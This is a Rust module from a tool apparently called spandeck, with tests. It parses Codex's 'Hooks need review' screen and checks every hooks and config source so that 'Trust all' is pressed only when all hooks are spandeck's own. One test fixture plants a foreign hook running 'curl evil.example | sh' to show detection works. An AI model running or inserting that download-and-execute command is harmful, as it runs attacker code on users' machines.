//! The screen an agent program shows when hooks it has not seen, or that
//! have changed, wait to be trusted: Codex's "Hooks need review"
//! (DECISIONS.md, "Trusting spandeck's own hooks").
//!
//! Like foldertrust.rs, this file only reads: a screen, and the files the
//! program takes hooks from. It presses nothing; whether a key is pressed,
//! and for whom, is decided in the daemon (core/hookstrust.rs).
//!
//! "Trust all and continue" trusts every new or changed hook the program
//! found, from every source. So two things are read here:
//!
//! - **The screen** (`read`), at the three levels of foldertrust.rs:
//!   `Exact` (the program's own screen from its first row to its last),
//!   `Choices` (the three choices and the line under them can be read, and
//!   something else is said above them) and `Mentioned`.
//! - **Whose hooks they can be** (`only_ours`): every place the program
//!   takes hooks from is looked at, and the answer is yes only when the one
//!   hooks file spandeck manages holds spandeck's entries as this version
//!   writes them and nothing else, and no other source exists. Whatever
//!   cannot be ruled out counts as another source.
//!
//! Where the screen comes from: Codex 0.169.0, read from a real pane by
//! the owner on 16 Nov 2026 (`pane.text`, the rows that were not empty):
//!
//! ```text
//!   Hooks need review
//!   12 hooks are new or changed.
//!   Hooks can run outside the sandbox after you trust them.
//! › 1. Review hooks
//!   2. Trust all and continue
//!   3. Continue without trusting (hooks won't run)
//!   enter confirm · esc skip
//! ```
//!
//! The wording for one hook, "1 hook is new or changed.", is from the words
//! in 0.169.0's program text (noted in this repository before the capture);
//! it has not been seen on a real screen. Not known, and so not allowed
//! for: what a taller screen has above the title, and whether a digit key
//! selects. A row wrapped by a terminal narrower than the screen's longest
//! row (57 columns) is not the known screen.
//!
//! Where Codex takes hooks from, as far as it is written down (the hooks
//! reference fetched 13 Nov 2026, see codex.rs, and the config reference
//! quoted in DECISIONS.md: "Untrusted projects skip project-scoped
//! `.codex/` layers, including project-local config, hooks, and rules"):
//! `hooks.json` and a `[hooks]` table in `config.toml`, in Codex's own
//! folder under the home folder and in a project's `.codex/`; the same in
//! the machine's `/etc/codex`; and a plugin, which can bring hooks of its
//! own. Which plugin does is not something spandeck can read, so any
//! plugin that is switched on counts as a source. `[hooks.state."…"]` in
//! `config.toml` holds Codex's own record of what was trusted
//! (`trusted_hash`), not hooks; how that hash is made is not documented,
//! so it is never compared and never written.

use std::path::{Path, PathBuf};

use serde_json::Value;

use crate::foldertrust::{choice, clean, Level};
use crate::{install, AgentKind};

/// Which of the three choices the program's marker is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mark {
    /// "1. Review hooks": where the marker starts.
    Review,
    /// "2. Trust all and continue".
    TrustAll,
    /// "3. Continue without trusting (hooks won't run)".
    Skip,
}

/// What a screen was read as.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Seen {
    pub level: Level,
    /// Known whenever the choices could be read.
    pub mark: Option<Mark>,
    /// How many hooks the screen says are new or changed, when it says so
    /// in the program's own words, once.
    pub count: Option<u32>,
}

struct Shape {
    title: &'static str,
    /// The row under the count.
    said: &'static str,
    choices: [&'static str; 3],
    marker: char,
    hint: &'static str,
}

const CODEX: Shape = Shape {
    title: "Hooks need review",
    said: "Hooks can run outside the sandbox after you trust them.",
    choices: [
        "1. Review hooks",
        "2. Trust all and continue",
        "3. Continue without trusting (hooks won't run)",
    ],
    marker: '›',
    hint: "enter confirm · esc skip",
};

fn shape(kind: AgentKind) -> Option<&'static Shape> {
    match kind {
        AgentKind::Codex => Some(&CODEX),
        _ => None,
    }
}

/// Does this program have a hooks review that spandeck can read? The tick
/// box is offered for these, and for no other.
pub fn asks(kind: AgentKind) -> bool {
    shape(kind).is_some()
}

/// The programs the tick box is offered for.
pub const PROGRAMS: [AgentKind; 1] = [AgentKind::Codex];

/// The choice spandeck takes for the owner, as the program words it.
pub fn answer(kind: AgentKind) -> Option<&'static str> {
    shape(kind).map(|s| &s.choices[1][3..])
}

/// One key towards "2. Trust all and continue", from where the marker is.
pub enum Step {
    /// The marker is on it: this key takes it.
    Confirm(&'static [u8]),
    /// This key moves the marker one row towards it. The screen is read
    /// again before anything else is pressed.
    Move(&'static [u8]),
}

/// How the trusting choice is reached: the arrow keys and Enter, as the
/// screen's own hint says ("enter confirm"). The one place to change if a
/// digit key turns out to select.
pub fn step(mark: Mark) -> Step {
    match mark {
        Mark::Review => Step::Move(b"\x1b[B"),
        Mark::TrustAll => Step::Confirm(b"\r"),
        Mark::Skip => Step::Move(b"\x1b[A"),
    }
}

/// "12 hooks are new or changed." (or "1 hook is new or changed."): the
/// number, and nothing but the program's own sentence.
fn count(row: &str) -> Option<u32> {
    if row == "1 hook is new or changed." {
        return Some(1);
    }
    let digits = row.strip_suffix(" hooks are new or changed.")?;
    let plain = !digits.is_empty()
        && digits.len() <= 4
        && digits.bytes().all(|b| b.is_ascii_digit())
        && !digits.starts_with('0');
    digits.parse().ok().filter(|n| plain && *n >= 2)
}

/// Read a pane's visible screen.
pub fn read(kind: AgentKind, lines: &[String]) -> Option<Seen> {
    let s = shape(kind)?;
    let rows: Vec<String> = lines
        .iter()
        .map(|l| clean(l))
        .filter(|l| !l.is_empty())
        .collect();
    read_shape(s, &rows).or_else(|| {
        mentions(s, &rows).then_some(Seen {
            level: Level::Mentioned,
            mark: None,
            count: None,
        })
    })
}

fn read_shape(s: &Shape, rows: &[String]) -> Option<Seen> {
    // The screen ends with the three choices and the line under them, and
    // exactly one choice is marked.
    let n = rows.len();
    if n < 4 || rows[n - 1] != s.hint {
        return None;
    }
    let mut mark = None;
    for (at, which) in [Mark::Review, Mark::TrustAll, Mark::Skip]
        .into_iter()
        .enumerate()
    {
        if choice(&rows[n - 4 + at], s.choices[at], s.marker)? {
            if mark.is_some() {
                return None;
            }
            mark = Some(which);
        }
    }
    mark?;
    let above = &rows[..n - 4];
    // Word for word, from the first thing on the screen.
    let exact =
        above.len() == 3 && above[0] == s.title && count(&above[1]).is_some() && above[2] == s.said;
    let mut counts = above.iter().filter_map(|r| count(r));
    let count = match (counts.next(), counts.next()) {
        (Some(n), None) => Some(n),
        _ => None,
    };
    Some(Seen {
        level: if exact { Level::Exact } else { Level::Choices },
        mark,
        count,
    })
}

/// Is the review on the screen at all? A row that begins with the title
/// or with one of the two choices that are only this screen's; the same
/// words inside a sentence are not it.
fn mentions(s: &Shape, rows: &[String]) -> bool {
    rows.iter().any(|r| {
        let r = r.trim_start_matches(|c: char| c.is_whitespace() || c == s.marker);
        r.starts_with(s.title) || r.starts_with(s.choices[1]) || r.starts_with(s.choices[2])
    })
}

/// Why the hooks under review may not all be spandeck's. Each is a reason
/// to press nothing and to offer no "trust all": the owner reviews them in
/// the terminal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Unsafe {
    /// The hooks file spandeck manages is not there, or holds none of its
    /// entries.
    NotInstalled,
    /// That file holds this many entries that are not spandeck's.
    NotOurs(u32),
    /// spandeck's entries in it are not what this version writes for this
    /// station (an older version's, another program path, or edited).
    Changed,
    /// Another hooks file exists: in the pane's folder or one above it, or
    /// the machine's.
    OtherFile(PathBuf),
    /// A config file that has a table of hooks.
    ConfigHooks(PathBuf),
    /// A config file that switches a plugin on; a plugin can bring hooks.
    Plugin(PathBuf),
    /// A file that could not be read or understood.
    Unreadable(PathBuf),
    /// The program was started with another settings folder.
    OtherHome,
    /// Hook settings on the program's own command line.
    Arguments,
    /// The screen asks about more hooks than spandeck has.
    Count { screen: u32, ours: u32 },
    /// A system on which the places are not known.
    UnknownSystem,
}

impl Unsafe {
    /// A short name, for a pane's view and the tests.
    pub fn code(&self) -> &'static str {
        match self {
            Unsafe::NotInstalled => "not_installed",
            Unsafe::NotOurs(_) => "not_ours",
            Unsafe::Changed => "changed",
            Unsafe::OtherFile(_) => "other_file",
            Unsafe::ConfigHooks(_) => "config_hooks",
            Unsafe::Plugin(_) => "plugin",
            Unsafe::Unreadable(_) => "unreadable",
            Unsafe::OtherHome => "other_home",
            Unsafe::Arguments => "arguments",
            Unsafe::Count { .. } => "count",
            Unsafe::UnknownSystem => "unknown_system",
        }
    }

    /// In plain words, for the pane's reason: what follows "asks you to
    /// trust hooks: ".
    pub fn says(&self) -> String {
        match self {
            Unsafe::NotInstalled => "spandeck's hooks are not installed for it here".into(),
            Unsafe::NotOurs(1) => "1 hook in its hooks file is not spandeck's".into(),
            Unsafe::NotOurs(n) => format!("{n} hooks in its hooks file are not spandeck's"),
            Unsafe::Changed => "spandeck's hooks in its hooks file are not the ones this version installs (run `spandeck integration install codex`)".into(),
            Unsafe::OtherFile(p) => format!("another hooks file is in this project or on this machine ({})", p.display()),
            Unsafe::ConfigHooks(p) => format!("{} has hooks of its own", p.display()),
            Unsafe::Plugin(p) => format!("{} switches a plugin on, and a plugin can bring hooks", p.display()),
            Unsafe::Unreadable(p) => format!("{} could not be read", p.display()),
            Unsafe::OtherHome => "it was started with another settings folder (CODEX_HOME)".into(),
            Unsafe::Arguments => "it was started with hook settings on its command line".into(),
            Unsafe::Count { screen, ours } => format!("it asks about {screen}, and spandeck has {ours}"),
            Unsafe::UnknownSystem => "on this system spandeck cannot tell whose they are".into(),
        }
    }
}

/// What a pane's program was started with, as far as it decides where the
/// program takes hooks from.
pub struct Start<'a> {
    pub home: &'a Path,
    /// The folder the pane was started in.
    pub cwd: &'a Path,
    /// This station's own program, as its hook entries name it.
    pub bin: &'a str,
    /// The program's whole command line.
    pub args: &'a [String],
    /// `CODEX_HOME` as the program sees it, when it is set.
    pub settings_home: Option<&'a Path>,
    /// The machine's own folder of Codex settings (`/etc/codex`).
    pub system: &'a Path,
}

/// Can the hooks this program asks about only be spandeck's? `Ok`: how
/// many hooks spandeck has there. Every file is read anew each time.
///
/// The number on the screen is held to be **at most** the number of
/// spandeck's hooks. It cannot be held to equal the number not yet
/// trusted: that would need Codex's `trusted_hash` of each hook, and how
/// it is made is not documented.
pub fn only_ours(kind: AgentKind, start: &Start, on_screen: Option<u32>) -> Result<u32, Unsafe> {
    if kind != AgentKind::Codex || crate::on_windows() {
        return Err(Unsafe::UnknownSystem);
    }
    let codex = start.home.join(".codex");
    if start.settings_home.is_some_and(|h| !same(h, &codex)) {
        return Err(Unsafe::OtherHome);
    }
    if names_hooks(start.args) {
        return Err(Unsafe::Arguments);
    }
    let ours = managed_file(kind, &codex.join("hooks.json"), start.bin)?;
    config_file(&codex.join("config.toml"))?;
    // The machine's own.
    if present(&start.system.join("hooks.json")) {
        return Err(Unsafe::OtherFile(start.system.join("hooks.json")));
    }
    for name in ["config.toml", "managed_config.toml", "requirements.toml"] {
        config_file(&start.system.join(name))?;
    }
    // The pane's folder and every folder above it: a project's own.
    let resolved = std::fs::canonicalize(start.cwd).ok();
    for from in [Some(start.cwd), resolved.as_deref()].into_iter().flatten() {
        for dir in from.ancestors() {
            let own = dir.join(".codex");
            if same(&own, &codex) {
                continue;
            }
            if present(&own.join("hooks.json")) {
                return Err(Unsafe::OtherFile(own.join("hooks.json")));
            }
            config_file(&own.join("config.toml"))?;
        }
    }
    match on_screen {
        Some(n) if n >= 1 && n <= ours => Ok(ours),
        Some(n) => Err(Unsafe::Count { screen: n, ours }),
        // Not said in words spandeck knows: nothing to hold it to.
        None => Err(Unsafe::Count { screen: 0, ours }),
    }
}

fn present(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok()
}

fn same(a: &Path, b: &Path) -> bool {
    a == b
        || match (std::fs::canonicalize(a), std::fs::canonicalize(b)) {
            (Ok(a), Ok(b)) => a == b,
            _ => false,
        }
}

/// Does the command line say anything about hooks? A `-c key=value`
/// setting whose key names them, or an option that does. spandeck's own
/// settings there (`mcp_servers.…`, the model) do not.
fn names_hooks(args: &[String]) -> bool {
    let mut setting = false;
    for arg in args {
        let lower = arg.to_lowercase();
        let key = |s: &str| s.split('=').next().unwrap_or("").contains("hook");
        if setting && key(&lower) {
            return true;
        }
        setting = matches!(arg.as_str(), "-c" | "--config");
        if let Some(rest) = lower.strip_prefix("--config=") {
            if key(rest) {
                return true;
            }
        } else if lower.starts_with('-') && key(&lower) {
            return true;
        }
    }
    false
}

/// The hooks file spandeck manages: every entry is spandeck's, and the
/// whole of it is what this version writes for this station. Returns how
/// many hooks that is.
fn managed_file(kind: AgentKind, path: &Path, bin: &str) -> Result<u32, Unsafe> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Err(Unsafe::NotInstalled),
        Err(_) => return Err(Unsafe::Unreadable(path.to_path_buf())),
    };
    let file: Value =
        serde_json::from_str(&text).map_err(|_| Unsafe::Unreadable(path.to_path_buf()))?;
    let root = file
        .as_object()
        .ok_or_else(|| Unsafe::Unreadable(path.to_path_buf()))?;
    let (mut ours, mut theirs) = (0u32, 0u32);
    for (key, value) in root {
        if key != "hooks" {
            // Nothing else is known to belong in this file.
            theirs += 1;
            continue;
        }
        let Some(events) = value.as_object() else {
            theirs += 1;
            continue;
        };
        for groups in events.values() {
            let Some(groups) = groups.as_array() else {
                theirs += 1;
                continue;
            };
            for group in groups {
                match group.get("hooks").and_then(|h| h.as_array()) {
                    Some(handlers) => {
                        for handler in handlers {
                            if install::is_ours(handler) {
                                ours += 1;
                            } else {
                                theirs += 1;
                            }
                        }
                    }
                    None => theirs += 1,
                }
            }
        }
    }
    if theirs > 0 {
        return Err(Unsafe::NotOurs(theirs));
    }
    if ours == 0 {
        return Err(Unsafe::NotInstalled);
    }
    // The marker alone is a comment anyone can write: the entries are
    // spandeck's when they are exactly what it writes.
    if root.get("hooks") != Some(&install::hooks_block(kind, bin)) {
        return Err(Unsafe::Changed);
    }
    Ok(ours)
}

/// A config file brings no hooks: it has no table of them (Codex's own
/// record of what was trusted, `[hooks.state]`, is not one) and switches
/// no plugin on. A file that is not there brings nothing.
fn config_file(path: &Path) -> Result<(), Unsafe> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(_) => return Err(Unsafe::Unreadable(path.to_path_buf())),
    };
    let table: toml::Table = text
        .parse()
        .map_err(|_| Unsafe::Unreadable(path.to_path_buf()))?;
    if has_hooks(&table) {
        return Err(Unsafe::ConfigHooks(path.to_path_buf()));
    }
    let plugin_on = match table.get("plugins") {
        None => false,
        Some(toml::Value::Table(plugins)) => plugins
            .values()
            .any(|p| p.get("enabled").and_then(|e| e.as_bool()) != Some(false)),
        Some(_) => true,
    };
    if plugin_on {
        return Err(Unsafe::Plugin(path.to_path_buf()));
    }
    Ok(())
}

/// A `hooks` key anywhere in the file (a profile may have one) that holds
/// anything but `state`.
fn has_hooks(table: &toml::Table) -> bool {
    table.iter().any(|(key, value)| match value {
        toml::Value::Table(inner) if key == "hooks" => inner.keys().any(|k| k != "state"),
        _ if key == "hooks" => true,
        toml::Value::Table(inner) => has_hooks(inner),
        toml::Value::Array(items) => items.iter().any(|i| i.as_table().is_some_and(has_hooks)),
        _ => false,
    })
}

/// The screen, drawn as the program draws it: what the stand-in agent
/// shows in the scenario tests, and what this file's own tests read.
pub mod drawn {
    use super::{Mark, CODEX};

    /// Codex 0.169.0's review of `count` hooks, with its marker on `mark`.
    pub fn codex(count: u32, mark: Mark) -> Vec<String> {
        let said = if count == 1 {
            "1 hook is new or changed.".to_string()
        } else {
            format!("{count} hooks are new or changed.")
        };
        let mut out = vec![
            String::new(),
            format!("  {}", CODEX.title),
            String::new(),
            format!("  {said}"),
            format!("  {}", CODEX.said),
            String::new(),
        ];
        for (at, which) in [Mark::Review, Mark::TrustAll, Mark::Skip]
            .into_iter()
            .enumerate()
        {
            let marker = if which == mark { "›" } else { " " };
            out.push(format!("{marker} {}", CODEX.choices[at]));
        }
        out.push(String::new());
        out.push(format!("  {}", CODEX.hint));
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rows(text: &[&str]) -> Vec<String> {
        text.iter().map(|s| s.to_string()).collect()
    }

    /// The rows of a real Codex 0.169.0 pane at its review (`pane.text`,
    /// the rows that were not empty, 16 Nov 2026), exactly.
    fn real() -> Vec<String> {
        rows(&[
            "  Hooks need review",
            "  12 hooks are new or changed.",
            "  Hooks can run outside the sandbox after you trust them.",
            "› 1. Review hooks",
            "  2. Trust all and continue",
            "  3. Continue without trusting (hooks won't run)",
            "  enter confirm · esc skip",
        ])
    }

    /// The owner's decision of 16 Nov 2026 and its boundary: only the
    /// program's own screen, from its first row to its last, is answered;
    /// what else shows the choices is the owner's one tap; and what is
    /// drawn for the stand-in agent is the captured screen.
    #[test]
    fn only_the_captured_screen_is_exact_and_its_marker_starts_on_review() {
        let exact = |mark, count| {
            Some(Seen {
                level: Level::Exact,
                mark: Some(mark),
                count: Some(count),
            })
        };
        assert_eq!(read(AgentKind::Codex, &real()), exact(Mark::Review, 12));
        let text = |l: &[String]| {
            l.iter()
                .filter(|l| !l.trim().is_empty())
                .cloned()
                .collect::<Vec<_>>()
        };
        assert_eq!(text(&drawn::codex(12, Mark::Review)), real());
        for mark in [Mark::Review, Mark::TrustAll, Mark::Skip] {
            let seen = read(AgentKind::Codex, &drawn::codex(3, mark));
            assert_eq!(seen, exact(mark, 3));
        }
        // One hook, in the words of the program's text.
        assert_eq!(
            read(AgentKind::Codex, &drawn::codex(1, Mark::Review)),
            exact(Mark::Review, 1)
        );
        // The trusting choice is reached by Down from where the marker
        // starts, and only Enter on it confirms.
        assert!(matches!(step(Mark::Review), Step::Move(b"\x1b[B")));
        assert!(matches!(step(Mark::TrustAll), Step::Confirm(b"\r")));
        assert!(matches!(step(Mark::Skip), Step::Move(b"\x1b[A")));
        assert_eq!(answer(AgentKind::Codex), Some("Trust all and continue"));

        let level = |rows: &[String]| read(AgentKind::Codex, rows).map(|s| s.level);
        let with = |at: usize, text: &str| {
            let mut r = real();
            r[at] = text.to_string();
            r
        };
        // Another program's pane: not read at all.
        for kind in [AgentKind::Claude, AgentKind::Antigravity, AgentKind::Shell] {
            assert_eq!(read(kind, &real()), None);
        }
        // Reworded, or a count that is not the program's sentence: the
        // choices are readable, the screen is not the known one.
        for (at, text) in [
            (0, "  Hooks need your review"),
            (1, "  12 hooks are new."),
            (1, "  twelve hooks are new or changed."),
            (1, "  1 hooks are new or changed."),
            (1, "  0 hooks are new or changed."),
            (1, "  012 hooks are new or changed."),
            (1, "  2 hook is new or changed."),
            (2, "  Hooks run inside the sandbox."),
        ] {
            assert_eq!(level(&with(at, text)), Some(Level::Choices), "{text}");
        }
        assert_eq!(
            read(AgentKind::Codex, &with(1, "  12 hooks are new.")).and_then(|s| s.count),
            None
        );
        // A row more: above, between, or after.
        let mut above = rows(&["  OpenAI Codex (v0.169.0)"]);
        above.extend(real());
        assert_eq!(
            read(AgentKind::Codex, &above),
            Some(Seen {
                level: Level::Choices,
                mark: Some(Mark::Review),
                count: Some(12)
            })
        );
        let mut between = real();
        between.insert(3, "  Also: 4 plugin hooks.".into());
        assert_eq!(level(&between), Some(Level::Choices));
        // Two counts: which is meant is not known.
        let mut two = real();
        two.insert(2, "  3 hooks are new or changed.".into());
        assert_eq!(read(AgentKind::Codex, &two).and_then(|s| s.count), None);
        let mut after = real();
        after.push("› ".into());
        assert_eq!(level(&after), Some(Level::Mentioned));
        // A fourth choice, a choice reworded, two markers, none.
        let mut fourth = real();
        fourth.insert(6, "  4. Trust all, always".into());
        assert_eq!(level(&fourth), Some(Level::Mentioned));
        assert_eq!(
            level(&with(4, "  2. Trust all hooks and continue")),
            Some(Level::Mentioned)
        );
        assert_eq!(
            level(&with(4, "› 2. Trust all and continue")),
            Some(Level::Mentioned)
        );
        assert_eq!(level(&with(3, "  1. Review hooks")), Some(Level::Mentioned));
        // The words in an agent's reply are not the screen.
        let said = rows(&[
            "• Codex showed \"Hooks need review\" and I chose 2. Trust all and continue.",
            "› ",
        ]);
        assert_eq!(read(AgentKind::Codex, &said), None);
    }

    /// Where hooks come from is only known off Windows (`only_ours`).
    #[cfg(unix)]
    mod sources {
        use super::*;
        use std::fs;

        struct Home {
            dir: tempfile::TempDir,
        }

        const BIN: &str = "/usr/local/bin/spandeck";

        impl Home {
            fn new() -> Home {
                let dir = tempfile::tempdir().unwrap();
                fs::create_dir_all(dir.path().join("home")).unwrap();
                fs::create_dir_all(dir.path().join("work/repo/deep")).unwrap();
                install::install(AgentKind::Codex, &dir.path().join("home"), BIN).unwrap();
                Home { dir }
            }
            fn path(&self, rel: &str) -> PathBuf {
                self.dir.path().join(rel)
            }
            fn write(&self, rel: &str, text: &str) {
                let path = self.path(rel);
                fs::create_dir_all(path.parent().unwrap()).unwrap();
                fs::write(path, text).unwrap();
            }
            fn check_with(
                &self,
                args: &[&str],
                settings_home: Option<&str>,
                count: Option<u32>,
            ) -> Result<u32, Unsafe> {
                let (home, cwd, system) = (
                    self.path("home"),
                    self.path("work/repo/deep"),
                    self.path("etc/codex"),
                );
                let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
                let settings = settings_home.map(|h| self.path(h));
                only_ours(
                    AgentKind::Codex,
                    &Start {
                        home: &home,
                        cwd: &cwd,
                        bin: BIN,
                        args: &args,
                        settings_home: settings.as_deref(),
                        system: &system,
                    },
                    count,
                )
            }
            fn check(&self) -> Result<u32, Unsafe> {
                self.check_with(&[], None, Some(12))
            }
        }

        /// The safety condition of the owner's decision (16 Nov 2026): "Trust
        /// all" trusts every hook Codex found, so nothing is pressed unless
        /// the set under review can only be spandeck's. Each other source,
        /// one at a time, and what the owner is told.
        #[test]
        fn the_hooks_can_only_be_spandecks_when_no_other_source_exists() {
            let h = Home::new();
            // What `spandeck integration install codex` writes: twelve hooks.
            assert_eq!(h.check(), Ok(12));
            // Codex's own records of what it trusted are not hooks; nor are
            // the settings spandeck puts on the command line, a plugin that
            // is switched off, or the program's own folder named as it is.
            h.write(
            "home/.codex/config.toml",
            "model = \"gpt-5\"\n[features]\ncodex_hooks = true\n[hooks.state.\"/home/me/.codex/hooks.json:pre_tool_use:0:0\"]\ntrusted_hash = \"sha256:00\"\n[plugins.\"x@y\"]\nenabled = false\n[projects.\"/home/me/code\"]\ntrust_level = \"trusted\"\n",
        );
            assert_eq!(
                h.check_with(
                    &[
                        "-c",
                        "mcp_servers.spandeck.command=\"/usr/local/bin/spandeck\"",
                        "-m",
                        "gpt-5",
                        "--cd",
                        "/home/me/webhooks"
                    ],
                    Some("home/.codex"),
                    Some(3)
                ),
                Ok(12)
            );
            let config = fs::read_to_string(h.path("home/.codex/config.toml")).unwrap();

            // The number on the screen: at most spandeck's own, and said.
            assert_eq!(
                h.check_with(&[], None, Some(13)),
                Err(Unsafe::Count {
                    screen: 13,
                    ours: 12
                })
            );
            assert!(h.check_with(&[], None, None).is_err());
            // Another settings folder, or hooks on the command line.
            fs::create_dir_all(h.path("scratch")).unwrap();
            assert_eq!(
                h.check_with(&[], Some("scratch"), Some(12)),
                Err(Unsafe::OtherHome)
            );
            for args in [
                &["-c", "hooks.Stop=[]"][..],
                &["--config", "profiles.x.hooks.Stop=[]"],
                &["--config=hooks.Stop=[]"],
                &["--hooks-file", "x.json"],
                &["-chooks.Stop=[]"],
            ] {
                assert_eq!(
                    h.check_with(args, None, Some(12)),
                    Err(Unsafe::Arguments),
                    "{args:?}"
                );
            }

            // Each of these is put there, looked at, and taken away again.
            type Case = (&'static str, &'static str, fn(&Unsafe) -> bool);
            let cases: Vec<Case> = vec![
            // A table of hooks in Codex's own config, or in a profile.
            (
                "home/.codex/config.toml",
                "[[hooks.Stop]]\nhooks = [{type = \"command\", command = \"say done\"}]\n",
                |u| matches!(u, Unsafe::ConfigHooks(_)),
            ),
            (
                "home/.codex/config.toml",
                "[hooks.state.x]\ntrusted_hash = \"sha256:00\"\n[profiles.fast.hooks]\nStop = []\n",
                |u| matches!(u, Unsafe::ConfigHooks(_)),
            ),
            // A plugin that is on, and a file that is not TOML.
            (
                "home/.codex/config.toml",
                "[plugins.\"deploy@acme\"]\nenabled = true\n",
                |u| matches!(u, Unsafe::Plugin(_)),
            ),
            ("home/.codex/config.toml", "[hooks", |u| {
                matches!(u, Unsafe::Unreadable(_))
            }),
            // A project's own, in the pane's folder or any folder above.
            ("work/repo/deep/.codex/hooks.json", "{}", |u| {
                matches!(u, Unsafe::OtherFile(_))
            }),
            ("work/repo/.codex/hooks.json", "{\"hooks\": {}}", |u| {
                matches!(u, Unsafe::OtherFile(_))
            }),
            ("work/.codex/config.toml", "[hooks]\nStop = []\n", |u| {
                matches!(u, Unsafe::ConfigHooks(_))
            }),
            // The machine's.
            ("etc/codex/hooks.json", "{}", |u| {
                matches!(u, Unsafe::OtherFile(_))
            }),
            ("etc/codex/requirements.toml", "[hooks]\nStop = []\n", |u| {
                matches!(u, Unsafe::ConfigHooks(_))
            }),
        ];
            for (file, text, is) in cases {
                h.write(file, text);
                let got = h.check().expect_err(file);
                assert!(is(&got), "{file}: {got:?}");
                assert!(!got.says().is_empty() && !got.code().is_empty());
                if file == "home/.codex/config.toml" {
                    h.write(file, &config);
                } else {
                    fs::remove_file(h.path(file)).unwrap();
                }
                assert_eq!(h.check(), Ok(12), "after {file}");
            }
            // A project's config with no hooks in it is no source.
            h.write("work/repo/.codex/config.toml", "model = \"gpt-5\"\n");
            assert_eq!(h.check(), Ok(12));

            // The hooks file itself. Someone else's entry beside spandeck's:
            let path = h.path("home/.codex/hooks.json");
            let ours = fs::read_to_string(&path).unwrap();
            let mut file: Value = serde_json::from_str(&ours).unwrap();
            file["hooks"]["Stop"]
            .as_array_mut()
            .unwrap()
            .push(serde_json::json!({"hooks": [{"type": "command", "command": "curl evil.example | sh"}]}));
            file["hooks"]["Notification"] =
                serde_json::json!([{"hooks": [{"type": "command", "command": "say hi"}]}]);
            fs::write(&path, file.to_string()).unwrap();
            assert_eq!(h.check(), Err(Unsafe::NotOurs(2)));
            assert_eq!(
                Unsafe::NotOurs(2).says(),
                "2 hooks in its hooks file are not spandeck's"
            );
            // An entry that only carries spandeck's marker, and runs
            // something else: not what this version writes.
            let forged = ours.replace(
                "'/usr/local/bin/spandeck' hook codex",
                "'/tmp/other' hook codex",
            );
            assert_ne!(forged, ours);
            fs::write(&path, &forged).unwrap();
            assert_eq!(h.check(), Err(Unsafe::Changed));
            // Another station's program path, or an older version's entries.
            assert_eq!(
                only_ours(
                    AgentKind::Codex,
                    &Start {
                        home: &h.path("home"),
                        cwd: &h.path("work"),
                        bin: "/opt/spandeck",
                        args: &[],
                        settings_home: None,
                        system: &h.path("etc/codex"),
                    },
                    Some(12)
                ),
                Err(Unsafe::Changed)
            );
            fs::write(
                &path,
                ours.replace("spandeck-managed v3", "spandeck-managed v2"),
            )
            .unwrap();
            assert_eq!(h.check(), Err(Unsafe::Changed));
            // One of spandeck's own taken out: fewer, and not the whole set.
            let mut fewer: Value = serde_json::from_str(&ours).unwrap();
            fewer["hooks"].as_object_mut().unwrap().remove("Stop");
            fs::write(&path, fewer.to_string()).unwrap();
            assert_eq!(h.check(), Err(Unsafe::Changed));
            // Something else in the file, no file, and not JSON.
            let mut more: Value = serde_json::from_str(&ours).unwrap();
            more["include"] = serde_json::json!(["other.json"]);
            fs::write(&path, more.to_string()).unwrap();
            assert_eq!(h.check(), Err(Unsafe::NotOurs(1)));
            fs::write(&path, "{}").unwrap();
            assert_eq!(h.check(), Err(Unsafe::NotInstalled));
            fs::write(&path, "{ not json").unwrap();
            assert!(matches!(h.check(), Err(Unsafe::Unreadable(_))));
            fs::remove_file(&path).unwrap();
            assert_eq!(h.check(), Err(Unsafe::NotInstalled));
            // Whole again: answered again.
            fs::write(&path, &ours).unwrap();
            assert_eq!(h.check(), Ok(12));
            // No other program has such a review.
            assert!(asks(AgentKind::Codex));
            for kind in [
                AgentKind::Claude,
                AgentKind::Antigravity,
                AgentKind::OpenCode,
            ] {
                assert!(!asks(kind));
            }
        }
    }
}
